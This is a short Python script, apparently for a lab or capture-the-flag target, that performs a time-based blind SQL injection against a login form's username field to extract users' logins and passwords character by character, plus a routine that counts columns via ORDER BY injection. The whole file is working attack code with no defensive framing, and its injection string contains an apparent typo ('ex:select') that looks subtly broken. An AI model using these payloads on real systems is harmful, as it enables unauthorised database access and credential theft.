import requests
import time
import string

def req(injection):
    url = "url"
    data = {'username': injection,'password':'okay'}
    r = requests.post(url, data=data)
    return r.text

def sqli():
    printables = string.printable
    nome_db = ''
    while True:
        for char in printables:
            guess_db = nome_db + char
            injection = "' union select 1,2,if(substring((ex:select group_concat(login,password) from users limit 0,1),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -"
            print(guess_db)
            before = time.time()
            req(injection)
            later = time.time()
            total = later - before
            if (int(total) >= 3):
                nome_db = guess_db
                break
'''id,login,password'''
def orderby():
    numbers = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
    for num in numbers:
        query = "' or 1=1 order by " + str(num) + ' -- -'
        print(num)
        if not 'default message' in req(query):
            print("Number of correct columns: " + str(num))

#orderby();
#sqli()